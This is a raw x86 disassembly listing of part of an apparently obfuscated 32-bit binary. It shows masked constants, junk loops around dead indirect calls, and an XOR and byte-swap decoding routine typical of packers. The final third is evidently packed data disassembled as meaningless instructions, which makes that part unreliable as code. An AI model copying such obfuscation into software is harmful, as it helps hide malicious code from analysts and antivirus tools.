  40809b:	xor    al,0xaa
  40809d:	mov    cl,0xf
  40809f:	xor    DWORD PTR ds:0x42a2b2,0x7a5d
  4080a9:	sub    cl,al
  4080ab:	add    dl,cl
  4080ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  4080b0:	xor    DWORD PTR ds:0x42a2d2,0x74a5
  4080ba:	xor    cl,0xaa
  4080bd:	xor    DWORD PTR ds:0x42a296,0x4bb3
  4080c7:	sub    cl,0xf
  4080ca:	add    DWORD PTR ds:0x42a2d6,0x42a2da
  4080d4:	ror    dl,cl
  4080d6:	sub    ecx,0x38f7
  4080dc:	xor    eax,eax
  4080de:	xor    DWORD PTR ds:0x42a2d2,0x8c7
  4080e8:	mov    eax,DWORD PTR [ebp-0xc]
  4080eb:	dec    DWORD PTR ds:0x42a266
  4080f1:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  4080f8:	and    DWORD PTR ds:0x42a296,0x0
  408102:	mov    eax,ds:0x42a296
  408107:	inc    eax
  408108:	mov    ds:0x42a296,eax
  40810d:	cmp    DWORD PTR ds:0x42a296,0x27
  408114:	ja     0x408132
  40811a:	jmp    0x408125
  40811f:	call   DWORD PTR ds:0x42a3e2
  408125:	cmp    DWORD PTR ds:0x42a296,0x1b
  40812c:	jb     0x408102
  408132:	mov    eax,DWORD PTR [ebp-0xc]
  408135:	xor    ecx,DWORD PTR ds:0x42a2c6
  40813b:	mov    ecx,DWORD PTR [ebp-0x28]
  40813e:	sub    DWORD PTR ds:0x42a2ce,0x42a2f2
  408148:	sub    eax,edi
  40814a:	and    DWORD PTR ds:0x42a25a,0x42a2f2
  408154:	xor    eax,esi
  408156:	mov    DWORD PTR ds:0x42a296,0x3de6
  408160:	cmp    eax,ecx
  408162:	mov    DWORD PTR ds:0x42a292,0x568e
  40816c:	jne    0x408200
  408172:	add    ecx,eax
  408174:	mov    eax,DWORD PTR [ebp-0x8]
  408177:	and    DWORD PTR ds:0x42a2ee,0x0
  408181:	mov    ecx,DWORD PTR ds:0x42a2ee
  408187:	inc    ecx
  408188:	mov    DWORD PTR ds:0x42a2ee,ecx
  40818e:	cmp    DWORD PTR ds:0x42a2ee,0x6
  408195:	jbe    0x4081df
  40819b:	jmp    0x4081b8
  4081a0:	push   0x42a296
  4081a5:	push   DWORD PTR [ebp-0x20]
  4081a8:	push   0x42903c
  4081ad:	push   0x4290aa
  4081b2:	call   DWORD PTR ds:0x42a3ea
  4081b8:	cmp    DWORD PTR ds:0x42a2ee,0x5
  4081bf:	jne    0x4081d2
  4081c5:	mov    ecx,DWORD PTR ds:0x42a2ee
  4081cb:	inc    ecx
  4081cc:	mov    DWORD PTR ds:0x42a2ee,ecx
  4081d2:	cmp    DWORD PTR ds:0x42a2ee,0x15
  4081d9:	jb     0x408181
  4081df:	mov    ecx,DWORD PTR [ebp-0x10]
  4081e2:	xor    eax,esi
  4081e4:	xor    ecx,esi
  4081e6:	sub    eax,ecx
  4081e8:	sub    eax,edi
  4081ea:	xor    eax,esi
  4081ec:	mov    DWORD PTR [ebp-0x8],eax
  4081ef:	mov    eax,DWORD PTR [ebp-0x10]
  4081f2:	xor    eax,esi
  4081f4:	mov    ecx,0xffcd8d8f
  4081f9:	sub    ecx,eax
  4081fb:	jmp    0x40820f
  408200:	mov    eax,DWORD PTR [ebp-0x10]
  408203:	xor    eax,esi
  408205:	mov    ecx,0xffcd8d0f
  40820a:	sub    ecx,eax
  40820c:	add    ecx,DWORD PTR [ebp-0xc]
  40820f:	mov    DWORD PTR [ebp-0xc],ecx
  408212:	mov    eax,DWORD PTR [ebp-0x8]
  408215:	cmp    eax,0xf89c85a5
  40821a:	jne    0x4037d5
  408220:	mov    DWORD PTR [ebp-0x34],0x9
  408227:	mov    ecx,DWORD PTR [ebp+0x8]
  40822a:	xor    ecx,esi
  40822c:	add    ecx,edi
  40822e:	jmp    0x40848e
  408233:	lea    eax,[ecx+ebx*1]
  408236:	mov    DWORD PTR [ebp-0x2c],eax
  408239:	mov    eax,DWORD PTR [ebp-0x58]
  40823c:	sub    eax,ecx
  40823e:	mov    DWORD PTR [ebp-0x1c],eax
  408241:	mov    eax,DWORD PTR [ebp-0x1c]
  408244:	mov    DWORD PTR [ebp-0x14],eax
  408247:	mov    eax,DWORD PTR [ebp-0x2c]
  40824a:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  408251:	mov    DWORD PTR [ebp-0x54],eax
  408254:	mov    DWORD PTR [ebp-0x20],0xf89c85ba
  40825b:	mov    eax,DWORD PTR [ebp-0x38]
  40825e:	xor    eax,esi
  408260:	add    eax,edi
  408262:	mov    DWORD PTR [ebp-0x10],eax
  408265:	mov    eax,DWORD PTR [ebp-0x38]
  408268:	xor    eax,esi
  40826a:	add    eax,edi
  40826c:	mov    DWORD PTR [ebp-0x8],eax
  40826f:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  408276:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  40827d:	mov    eax,DWORD PTR [ebp-0x38]
  408280:	mov    edx,DWORD PTR [ebp-0x14]
  408283:	xor    eax,esi
  408285:	add    eax,edi
  408287:	cmp    edx,eax
  408289:	je     0x408482
  40828f:	mov    eax,DWORD PTR [ebp-0x20]
  408292:	xor    eax,esi
  408294:	mov    edx,0xffcd8d0f
  408299:	sub    edx,eax
  40829b:	add    edx,DWORD PTR [ebp-0x14]
  40829e:	mov    eax,DWORD PTR [ebp-0x20]
  4082a1:	mov    ebx,DWORD PTR [ebp-0x10]
  4082a4:	xor    eax,esi
  4082a6:	add    eax,edi
  4082a8:	imul   eax,ebx
  4082ab:	cmp    eax,edx
  4082ad:	ja     0x40847f
  4082b3:	mov    edx,DWORD PTR [ebp-0x10]
  4082b6:	mov    eax,DWORD PTR [ebp-0x14]
  4082b9:	mov    ebx,DWORD PTR [ebp-0x2c]
  4082bc:	sub    eax,edx
  4082be:	xor    ebx,esi
  4082c0:	xor    edx,edx
  4082c2:	add    ebx,edi
  4082c4:	div    ebx
  4082c6:	mov    DWORD PTR [ebp-0x8],eax
  4082c9:	mov    eax,DWORD PTR [ebp-0x44]
  4082cc:	mov    edx,DWORD PTR [ebp-0x8]
  4082cf:	xor    eax,esi
  4082d1:	add    eax,edi
  4082d3:	cmp    edx,eax
  4082d5:	jbe    0x4082e5
  4082db:	mov    eax,DWORD PTR [ebp-0x44]
  4082de:	xor    eax,esi
  4082e0:	add    eax,edi
  4082e2:	mov    DWORD PTR [ebp-0x8],eax
  4082e5:	mov    eax,DWORD PTR [ebp-0x2c]
  4082e8:	mov    edx,DWORD PTR [ebp-0x8]
  4082eb:	xor    eax,esi
  4082ed:	add    eax,edi
  4082ef:	imul   eax,edx
  4082f2:	mov    DWORD PTR [ebp-0x8],eax
  4082f5:	mov    eax,DWORD PTR [ebp-0x38]
  4082f8:	mov    edx,DWORD PTR [ebp-0x8]
  4082fb:	xor    eax,esi
  4082fd:	add    eax,edi
  4082ff:	cmp    edx,eax
  408301:	je     0x408468
  408307:	mov    eax,DWORD PTR [ebp-0x8]
  40830a:	mov    DWORD PTR [ebp-0x18],eax
  40830d:	mov    eax,DWORD PTR [ebp-0x10]
  408310:	add    eax,DWORD PTR [ebp-0x54]
  408313:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  40831a:	mov    DWORD PTR [ebp-0x8],eax
  40831d:	mov    eax,0xf89c85ba
  408322:	mov    DWORD PTR [ebp-0x28],eax
  408325:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40832c:	mov    DWORD PTR [ebp-0x40],0xf89c85b8
  408333:	mov    DWORD PTR [ebp-0x30],eax
  408336:	mov    eax,DWORD PTR [ebp-0x1c]
  408339:	xor    eax,esi
  40833b:	add    eax,edi
  40833d:	jmp    0x408424
  408342:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  408349:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  408350:	mov    eax,DWORD PTR [ebp-0x30]
  408353:	mov    edx,DWORD PTR [ebp-0xc]
  408356:	xor    eax,esi
  408358:	add    eax,edi
  40835a:	imul   eax,edx
  40835d:	mov    edx,DWORD PTR [ebp-0x8]
  408360:	mov    al,BYTE PTR [eax+edx*1]
  408363:	mov    BYTE PTR [ebp-0x1],al
  408366:	mov    eax,DWORD PTR [ebp-0x30]
  408369:	mov    edx,DWORD PTR [ebp-0xc]
  40836c:	xor    eax,esi
  40836e:	add    eax,edi
  408370:	imul   eax,edx
  408373:	mov    edx,DWORD PTR [ebp-0x5c]
  408376:	xor    edx,esi
  408378:	add    eax,edx
  40837a:	mov    edx,DWORD PTR [ebp-0x8]
  40837d:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  408385:	mov    edx,DWORD PTR [ebp-0x4c]
  408388:	xor    edx,esi
  40838a:	lea    eax,[edx+eax*1+0x3272f1]
  408391:	movzx  edx,BYTE PTR [ebp-0x1]
  408395:	xor    edx,eax
  408397:	mov    BYTE PTR [ebp-0x1],dl
  40839a:	mov    al,BYTE PTR [ebp-0x1]
  40839d:	mov    edx,DWORD PTR [ebp-0x30]
  4083a0:	mov    ebx,DWORD PTR [ebp-0xc]
  4083a3:	xor    edx,esi
  4083a5:	add    edx,edi
  4083a7:	imul   edx,ebx
  4083aa:	mov    ebx,DWORD PTR [ebp-0x8]
  4083ad:	mov    BYTE PTR [edx+ebx*1],al
  4083b0:	mov    eax,DWORD PTR [ebp-0x30]
  4083b3:	mov    edx,DWORD PTR [ebp-0xc]
  4083b6:	xor    eax,esi
  4083b8:	add    eax,edi
  4083ba:	imul   eax,edx
  4083bd:	mov    edx,DWORD PTR [ebp-0x8]
  4083c0:	mov    al,BYTE PTR [eax+edx*1]
  4083c3:	mov    BYTE PTR [ebp-0x1],al
  4083c6:	mov    eax,DWORD PTR [ebp-0x30]
  4083c9:	mov    edx,DWORD PTR [ebp-0xc]
  4083cc:	xor    eax,esi
  4083ce:	add    eax,edi
  4083d0:	imul   eax,edx
  4083d3:	mov    edx,DWORD PTR [ebp-0x28]
  4083d6:	xor    edx,esi
  4083d8:	add    eax,edx
  4083da:	mov    edx,DWORD PTR [ebp-0x8]
  4083dd:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  4083e5:	mov    edx,DWORD PTR [ebp-0x50]
  4083e8:	xor    edx,esi
  4083ea:	lea    eax,[edx+eax*1+0x3272f1]
  4083f1:	movzx  edx,BYTE PTR [ebp-0x1]
  4083f5:	xor    edx,eax
  4083f7:	mov    BYTE PTR [ebp-0x1],dl
  4083fa:	mov    al,BYTE PTR [ebp-0x1]
  4083fd:	mov    edx,DWORD PTR [ebp-0x30]
  408400:	mov    ebx,DWORD PTR [ebp-0xc]
  408403:	xor    edx,esi
  408405:	add    edx,edi
  408407:	imul   edx,ebx
  40840a:	mov    ebx,DWORD PTR [ebp-0x8]
  40840d:	mov    BYTE PTR [edx+ebx*1],al
  408410:	mov    eax,DWORD PTR [ebp-0x40]
  408413:	mov    edx,DWORD PTR [ebp-0x28]
  408416:	xor    eax,esi
  408418:	xor    edx,esi
  40841a:	add    eax,edi
  40841c:	add    edx,edi
  40841e:	imul   eax,edx
  408421:	add    eax,DWORD PTR [ebp-0xc]
  408424:	mov    DWORD PTR [ebp-0xc],eax
  408427:	mov    eax,DWORD PTR [ebp-0xc]
  40842a:	mov    edx,DWORD PTR [ebp-0x18]
  40842d:	cmp    edx,eax
  40842f:	jb     0x408342
  408435:	mov    eax,DWORD PTR [ebp-0x28]
  408438:	mov    edx,DWORD PTR [ebp-0x18]
  40843b:	xor    eax,esi
  40843d:	add    eax,edi
  40843f:	imul   eax,edx
  408442:	mov    edx,DWORD PTR [ebp-0x1c]
  408445:	xor    edx,esi
  408447:	add    edx,edi
  408449:	or     eax,edx
  40844b:	mov    edx,DWORD PTR [ebp-0x20]
  40844e:	xor    edx,esi
  408450:	add    eax,edx
  408452:	mov    edx,DWORD PTR [ebp-0x20]
  408455:	xor    edx,esi
  408457:	add    eax,edx
  408459:	mov    edx,DWORD PTR [ebp-0x10]
  40845c:	lea    eax,[eax+edx*1+0x64e5e2]
  408463:	jmp    0x408477
  408468:	mov    eax,DWORD PTR [ebp-0x20]
  40846b:	mov    edx,DWORD PTR [ebp-0x10]
  40846e:	xor    eax,esi
  408470:	lea    eax,[eax+edx*1+0x3272f1]
  408477:	mov    DWORD PTR [ebp-0x10],eax
  40847a:	jmp    0x40828f
  40847f:	mov    ebx,DWORD PTR [ebp-0x3c]
  408482:	mov    eax,DWORD PTR [ebp+0xc]
  408485:	xor    eax,esi
  408487:	lea    ecx,[ecx+eax*1+0x3272f1]
  40848e:	lea    eax,[ecx-0x3272f1]
  408494:	xor    eax,esi
  408496:	cmp    eax,0xf89c95a5
  40849b:	jne    0x408233
  4084a1:	dec    DWORD PTR [ebp-0x34]
  4084a4:	jne    0x408227
  4084aa:	mov    eax,DWORD PTR [ebp+0x8]
  4084ad:	mov    ecx,DWORD PTR [ebp+0xc]
  4084b0:	mov    edx,DWORD PTR [ebp+0x8]
  4084b3:	xor    ecx,esi
  4084b5:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f1]
  4084bc:	xor    eax,esi
  4084be:	mov    al,BYTE PTR [eax+ebx*1+0x3272f1]
  4084c5:	xor    edx,esi
  4084c7:	mov    BYTE PTR [edx+ebx*1+0x3272f1],cl
  4084ce:	mov    ecx,DWORD PTR [ebp+0xc]
  4084d1:	xor    ecx,esi
  4084d3:	mov    BYTE PTR [ecx+ebx*1+0x3272f1],al
  4084da:	mov    eax,DWORD PTR [ebp+0xc]
  4084dd:	xor    eax,esi
  4084df:	add    eax,edi
  4084e1:	pop    edi
  4084e2:	pop    esi
  4084e3:	pop    ebx
  4084e4:	leave  
  4084e5:	ret    0x8
  4084e8:	xor    eax,eax
  4084ea:	and    DWORD PTR ds:0x42a2f6,0x42a2fa
  4084f4:	inc    eax
  4084f5:	ret    
  4084f6:	push   ebp
  4084f7:	mov    ebp,esp
  4084f9:	sub    esp,0x38
  4084fc:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  408503:	push   ebx
  408504:	mov    DWORD PTR ds:0x42a29a,0x1c
  40850e:	cmp    DWORD PTR ds:0x42a29a,0x0
  408515:	je     0x408551
  40851b:	cmp    DWORD PTR ds:0x42a29a,0x21
  408522:	jg     0x408551
  408528:	jmp    0x40853e
  40852d:	push   DWORD PTR [ebp-0x28]
  408530:	push   0x42a2b2
  408535:	push   DWORD PTR [ebp-0x18]
  408538:	call   DWORD PTR ds:0x42a3ee
  40853e:	xor    eax,eax
  408540:	xor    eax,DWORD PTR ds:0x42a29a
  408546:	dec    eax
  408547:	mov    ds:0x42a29a,eax
  40854c:	jmp    0x40850e
  408551:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  408558:	and    DWORD PTR ds:0x42a292,ebx
  40855e:	mov    eax,DWORD PTR [ebp-0x4]
  408561:	push   esi
  408562:	mov    esi,0x75108aa
  408567:	sub    DWORD PTR ds:0x42a28a,0x606e
  408571:	xor    eax,esi
  408573:	push   edi
  408574:	mov    edi,0x3272f1
  408579:	add    eax,edi
  40857b:	add    DWORD PTR ds:0x42a28e,0x42a2ae
  408585:	mov    DWORD PTR [ebp-0x1c],eax
  408588:	mov    eax,DWORD PTR [ebp+0x14]
  40858b:	xor    DWORD PTR ds:0x42a2de,0x42a302
  408595:	test   eax,eax
  408597:	je     0x4085af
  40859d:	mov    eax,DWORD PTR [ebp+0x14]
  4085a0:	adc    DWORD PTR ds:0x42a26e,0x42a2ca
  4085aa:	mov    eax,DWORD PTR [eax]
  4085ac:	mov    DWORD PTR [ebp-0x1c],eax
  4085af:	mov    ebx,DWORD PTR ds:0x42a256
  4085b5:	and    DWORD PTR ds:0x42a2e6,ebx
  4085bb:	mov    eax,DWORD PTR [ebp-0x4]
  4085be:	xor    eax,esi
  4085c0:	adc    DWORD PTR ds:0x42a2c6,0x7b40
  4085ca:	add    eax,edi
  4085cc:	xor    DWORD PTR ds:0x42a2c6,0x5a4b
  4085d6:	mov    DWORD PTR [ebp-0x8],eax
  4085d9:	mov    eax,DWORD PTR [ebp-0xc]
  4085dc:	dec    DWORD PTR ds:0x42a2be
  4085e2:	xor    eax,esi
  4085e4:	add    eax,edi
  4085e6:	and    DWORD PTR ds:0x42a2be,0x0
  4085f0:	jmp    0x408602
  4085f5:	mov    ebx,DWORD PTR ds:0x42a2be
  4085fb:	inc    ebx
  4085fc:	mov    DWORD PTR ds:0x42a2be,ebx
  408602:	cmp    DWORD PTR ds:0x42a2be,0x13
  408609:	jae    0x408650
  40860f:	cmp    DWORD PTR ds:0x42a2be,0x4
  408616:	jb     0x408650
  40861c:	jmp    0x408631
  408621:	push   0x68db
  408626:	push   0x42a266
  40862b:	call   DWORD PTR ds:0x42a3f2
  408631:	cmp    DWORD PTR ds:0x42a2be,0x3
  408638:	jne    0x40864b
  40863e:	mov    ebx,DWORD PTR ds:0x42a2be
  408644:	inc    ebx
  408645:	mov    DWORD PTR ds:0x42a2be,ebx
  40864b:	jmp    0x4085f5
  408650:	mov    DWORD PTR [ebp-0x24],eax
  408653:	mov    ebx,DWORD PTR ds:0x42a316
  408659:	mov    ebx,DWORD PTR [ebx]
  40865b:	xor    DWORD PTR ds:0x42a2ae,ebx
  408661:	mov    eax,DWORD PTR [ebp-0x4]
  408664:	mov    DWORD PTR ds:0x42a2fa,0x14
  40866e:	cmp    DWORD PTR ds:0x42a2fa,0x0
  408675:	je     0x4086aa
  40867b:	cmp    DWORD PTR ds:0x42a2fa,0x16
  408682:	jbe    0x4086aa
  408688:	jmp    0x408698
  40868d:	push   0x42a256
  408692:	call   DWORD PTR ds:0x42a3f6
  408698:	mov    ebx,DWORD PTR ds:0x42a2fa
  40869e:	dec    ebx
  40869f:	mov    DWORD PTR ds:0x42a2fa,ebx
  4086a5:	jmp    0x40866e
  4086aa:	xor    eax,esi
  4086ac:	movzx  ebx,BYTE PTR ds:0x42a2aa
  4086b3:	adc    ebx,DWORD PTR ds:0x42a2de
  4086b9:	mov    DWORD PTR ds:0x42a2aa,ebx
  4086bf:	add    eax,edi
  4086c1:	mov    DWORD PTR ds:0x42a29e,0x16
  4086cb:	cmp    DWORD PTR ds:0x42a29e,0x0
  4086d2:	je     0x408713
  4086d8:	cmp    DWORD PTR ds:0x42a29e,0x1e
  4086df:	jle    0x408713
  4086e5:	jmp    0x4086ff
  4086ea:	push   0x8495
  4086ef:	push   0x42a2a2
  4086f4:	push   0x13ea
  4086f9:	call   DWORD PTR ds:0x42a3fa
  4086ff:	xor    ebx,ebx
  408701:	add    ebx,DWORD PTR ds:0x42a29e
  408707:	dec    ebx
  408708:	mov    DWORD PTR ds:0x42a29e,ebx
  40870e:	jmp    0x4086cb
  408713:	mov    DWORD PTR [ebp-0x30],eax
  408716:	sub    DWORD PTR ds:0x42a2b2,0x244c
  408720:	mov    ebx,DWORD PTR [ebp-0x4]
  408723:	xor    ebx,esi
  408725:	neg    DWORD PTR ds:0x42a2f6
  40872b:	add    ebx,edi
  40872d:	and    DWORD PTR ds:0x42a2ba,0x0
  408737:	xor    eax,eax
  408739:	or     eax,DWORD PTR ds:0x42a2ba
  40873f:	inc    eax
  408740:	mov    ds:0x42a2ba,eax
  408745:	cmp    DWORD PTR ds:0x42a2ba,0x6
  40874c:	jg     0x408791
  408752:	jmp    0x40876c
  408757:	push   0x385f
  40875c:	push   0x7a18
  408761:	push   0x5bac
  408766:	call   DWORD PTR ds:0x42a402
  40876c:	cmp    DWORD PTR ds:0x42a2ba,0x5
  408773:	jne    0x408784
  408779:	mov    eax,ds:0x42a2ba
  40877e:	inc    eax
  40877f:	mov    ds:0x42a2ba,eax
  408784:	cmp    DWORD PTR ds:0x42a2ba,0x13
  40878b:	jb     0x408737
  408791:	mov    eax,DWORD PTR [ebp-0x24]
  408794:	add    DWORD PTR ds:0x42a27e,0x42a26e
  40879e:	sub    eax,edi
  4087a0:	lea    ecx,[ebx-0x3272f1]
  4087a6:	xor    eax,esi
  4087a8:	sbb    DWORD PTR ds:0x42a286,0x7a3b
  4087b2:	jmp    0x40ab40
  4087b7:	inc    esp
  4087b8:	arpl   WORD PTR [esi+esi*8],di
  4087bb:	and    al,0x96
  4087bd:	xchg   ch,cl
  4087bf:	sahf   
  4087c0:	pushf  
  4087c1:	ja     0x4087a5
  4087c3:	xlat   BYTE PTR ds:[ebx]
  4087c4:	inc    esp
  4087c5:	lea    ecx,[edi+ecx*8+0x14]
  4087c9:	add    DWORD PTR [ebx-0x7c7ca1f4],0xffffffa4
  4087d0:	mov    edi,0x423938aa
  4087d5:	mov    cl,0x6d
  4087d7:	stos   BYTE PTR es:[edi],al
  4087d8:	jno    0x408848
  4087da:	mov    ah,0x8d
  4087dc:	mov    ah,0x7b
  4087de:	cmp    ebx,DWORD PTR [esi+0x36]
  4087e1:	cmp    eax,0x86e50e37
  4087e6:	dec    edi
  4087e7:	js     0x40881a
  4087e9:	sbb    al,0x29
  4087eb:	mov    dl,0xc2
  4087ed:	add    BYTE PTR [esi+0x26fb8ea5],bh
  4087f3:	jbe    0x408849
  4087f5:	daa    
  4087f6:	inc    ecx
  4087f7:	adc    BYTE PTR [ecx+0x5b],ah
  4087fa:	sub    eax,0x54c24487
  4087ff:	cmp    esp,DWORD PTR [esi+0x6ccfa443]
  408805:	and    esi,DWORD PTR [edi+0xcda8d90]
  40880b:	mov    ebx,ss
  40880d:	jg     0x408879
  40880f:	sahf   
  408810:	cmp    eax,0x5d8b0ae2
  408815:	xchg   ebx,eax
  408816:	xchg   esp,eax
  408817:	mov    al,ds:0x8aba0908
  40881c:	(bad)  
  40881d:	jae    0x408889
  40881f:	out    0x8b,eax
  408821:	retf   
  408822:	inc    edi
  408823:	pop    ecx
  408824:	cld    
  408825:	stc    
  408826:	sub    bh,al
  408828:	data16 mov ds,WORD PTR [edx]
  40882b:	fsub   DWORD PTR [eax-0x5ec5403e]
  408831:	out    0x8e,eax
  408833:	(bad)  
  408834:	mov    ah,0x6
  408836:	xchg   esp,eax
  408837:	rcr    dl,0x27
  40883a:	in     eax,0x53
  40883c:	push   cs
  40883d:	ins    DWORD PTR es:[edi],dx
  40883e:	and    bl,BYTE PTR [ecx]
  408840:	lock inc esi
  408842:	ror    BYTE PTR ds:0x5b2a52c4,1
  408848:	js     0x408809
  40884a:	or     BYTE PTR [esi+0x4a],ch
  40884d:	or     cl,BYTE PTR [esp+edx*1-0x24]
  408851:	(bad)  
  408852:	or     ch,BYTE PTR [eax-0x46]
  408855:	sahf   
  408856:	jp     0x408835
  408858:	dec    edx
  408859:	push   ecx
  40885a:	jne    0x40884a
  40885c:	mov    eax,0xaa5158df
  408861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408862:	adc    cl,cl
  408864:	test   BYTE PTR ds:0xfb9e5acd,0x75
  40886b:	int    0x9d
  40886d:	ror    ebx,cl
  40886f:	dec    ecx
  408870:	(bad)  
  408872:	inc    esp
  408873:	pop    ecx
  408874:	xchg   esi,eax
  408875:	or     eax,0xa1d813be
  40887a:	xchg   esp,eax
  40887b:	ss inc ebp
  40887d:	add    eax,0xecc4f806
  408882:	push   ds
  408883:	or     al,0x18
  408885:	ins    DWORD PTR es:[edi],dx
  408886:	mov    ds,WORD PTR [ecx+0x2080ec71]
  40888c:	xlat   BYTE PTR ds:[ebx]
  40888d:	xchg   esp,eax
  40888e:	(bad)  [eax]
  408890:	int3   
  408891:	mov    dl,0x27
  408893:	fstp   TBYTE PTR [edi-0x591916d]
  408899:	push   ebx
  40889a:	bound  esi,QWORD PTR [ebp-0x302eb01b]
  4088a0:	mov    DWORD PTR [edx+0x26d783bb],eax
  4088a6:	xor    ecx,DWORD PTR [eax+0x15]
  4088a9:	push   edx
  4088aa:	xchg   edi,eax
  4088ab:	popf   
  4088ac:	nop
  4088ad:	add    al,BYTE PTR [eax+0x400634f7]
  4088b3:	mov    edx,0x30fe439
  4088b8:	repz inc edx
  4088ba:	jmp    0x8813:0x80cb73d5
  4088c1:	enter  0x22a2,0x28
  4088c5:	jno    0x4088fc
  4088c7:	sub    BYTE PTR gs:[bp+si-0x1e],al
  4088cc:	lods   al,BYTE PTR ds:[esi]
  4088cd:	jne    0x408923
  4088cf:	out    dx,eax
  4088d0:	push   esi
  4088d1:	jmp    0x4088f4
  4088d3:	aam    0xac
  4088d5:	mov    ds:0x4ed75862,al
  4088da:	cmp    dl,BYTE PTR ds:0x83eff592
  4088e0:	in     eax,dx
  4088e1:	mov    ecx,es
  4088e3:	push   ebp
  4088e4:	sbb    DWORD PTR ds:0x74caa76a,edx
  4088ea:	and    esi,DWORD PTR [eax+eax*2]
  4088ed:	in     al,0xc
  4088ef:	jle    0x408959
  4088f1:	sub    ebx,DWORD PTR ds:0x8ea3399e
  4088f7:	pushf  
  4088f8:	clc    
  4088f9:	inc    BYTE PTR [ebx+0x3fa0114]
  4088ff:	sbb    eax,0x9a850989
  408904:	xchg   ebx,eax
  408905:	inc    edx
  408906:	jge    0x4088fa
  408908:	cwde   
  408909:	mov    esi,0xb47f6c8e
  40890e:	or     BYTE PTR [ecx-0x1f3fba0f],0x71
  408915:	push   edx
  408916:	lea    ebx,ds:0x306c2ab3
  40891c:	bound  edx,QWORD PTR [edi]
  40891e:	shr    ecx,0x7a
  408921:	outs   dx,DWORD PTR ds:[esi]
  408922:	bound  esi,QWORD PTR [eax+0x5a]
  408925:	fbstp  TBYTE PTR [eax+ecx*2+0x2a8404cc]
  40892c:	fimul  DWORD PTR [ecx]
  40892e:	cmp    cl,ch
  408930:	mov    ah,0x37
  408932:	mov    edx,0xb72172c5
  408937:	popf   
  408938:	stc    
  408939:	outs   dx,DWORD PTR ds:[esi]
  40893a:	and    esi,DWORD PTR [ebx+0x7d]
  40893d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40893e:	aad    0xfd
  408940:	stos   BYTE PTR es:[edi],al
  408941:	xchg   edi,eax
  408942:	ss xchg edx,eax
  408944:	dec    esp
  408945:	mov    al,ds:0xce33ecc1
  40894a:	mov    edi,0x785bf742
  40894f:	pop    esp
  408950:	js     0x408957
  408952:	aad    0x89
  408954:	scas   eax,DWORD PTR es:[edi]
  408955:	test   BYTE PTR [eax],bh
  408957:	rol    DWORD PTR [eax-0x22],0x92
  40895b:	in     eax,dx
  40895c:	sbb    DWORD PTR [eax+0x49],ecx
  40895f:	fistp  QWORD PTR [edi+0x6c]
  408962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408963:	js     0x408970
  408965:	mov    al,ds:0x86b82b30
  40896a:	mov    eax,ds:0x19315b76
  40896f:	pop    ebp
  408971:	mov    bl,0x37
  408973:	dec    esp
  408974:	cmp    eax,0x2a6639e4
  408979:	mov    ebp,0xe1bafa86
  40897e:	fwait
  40897f:	cwde   
  408980:	les    ecx,FWORD PTR [edx+0x26d7f135]
  408986:	popa   
  408987:	dec    esp
  408988:	xchg   edi,eax
  408989:	(bad)  
  40898a:	pop    edx
  40898b:	push   ss
  40898c:	lods   eax,DWORD PTR ds:[esi]
  40898d:	dec    ebx
  40898e:	out    dx,eax
  40898f:	add    ebp,ebp
  408991:	bound  ebp,QWORD PTR [edx+0x5cf19aa8]
  408997:	jge    0x40891a
  408999:	sets   BYTE PTR [ebx+0x51]
  40899d:	mov    al,ds:0x218b0e6d
  4089a2:	xchg   BYTE PTR [edi+0x45],cl
  4089a5:	pop    esi
  4089a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089a7:	retf   
  4089a8:	ret    0x2398
  4089ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089ac:	outs   dx,DWORD PTR ds:[esi]
  4089ad:	popa   
  4089ae:	pop    ecx
  4089af:	cmp    eax,ebx
  4089b1:	xor    DWORD PTR [edx],edi
  4089b3:	inc    esp
  4089b4:	jnp    0x4089bd
  4089b6:	pop    ss
  4089b7:	ret    0xf83d
  4089ba:	sbb    DWORD PTR [edi],eax
  4089bc:	add    eax,0x9d453617
  4089c1:	xor    dl,BYTE PTR [eax]
  4089c3:	xchg   eax,ecx
  4089c5:	xor    al,0x53
  4089c7:	lahf   
  4089c8:	ficom  WORD PTR [eax]
  4089ca:	call   0x1fcae893
  4089cf:	jg     0x408a4b
  4089d1:	fst    QWORD PTR [ebx+0xa82b5bf]
  4089d7:	mov    bl,0xa6
  4089d9:	cdq    
  4089da:	pop    esp
  4089db:	sbb    al,0x6e
  4089dd:	mov    ah,0x9
  4089df:	ficomp DWORD PTR [ebp-0x55c5f092]
  4089e5:	popa   
  4089e6:	lahf   
  4089e7:	in     eax,0x79
  4089e9:	mov    DWORD PTR [edx-0x1e],0xcc7f7c5b
  4089f0:	hlt    
  4089f1:	jl     0x408a4f
  4089f3:	or     BYTE PTR [esi+esi*4-0x1e0be5c5],bl
  4089fa:	mov    dl,0xeb
  4089fc:	pushf  
  4089fd:	jmp    0x32485381
  408a02:	jns    0x408a1c
  408a04:	cdq    
  408a05:	mov    bl,0xdd
  408a07:	ror    DWORD PTR [eax+esi*2+0x3b3c3cac],cl
  408a0e:	ins    DWORD PTR es:[edi],dx
  408a0f:	cmp    dl,dl
  408a11:	cld    
  408a12:	fwait
  408a13:	pop    ds
  408a14:	loop   0x4089dc
  408a16:	xchg   esp,eax
  408a17:	inc    eax
  408a18:	fstp   TBYTE PTR [esi+ecx*8+0x4f]
  408a1c:	sbb    BYTE PTR [edx],ch
  408a1e:	mov    eax,0x298a9188
  408a23:	dec    edx
  408a24:	lea    edi,[ebx]
  408a26:	push   esi
  408a27:	pop    ss
  408a28:	sub    ch,BYTE PTR [esi]
  408a2a:	sub    BYTE PTR [ebp+0x1d00df42],bl
  408a30:	shr    DWORD PTR [edi-0x734230e4],0x42
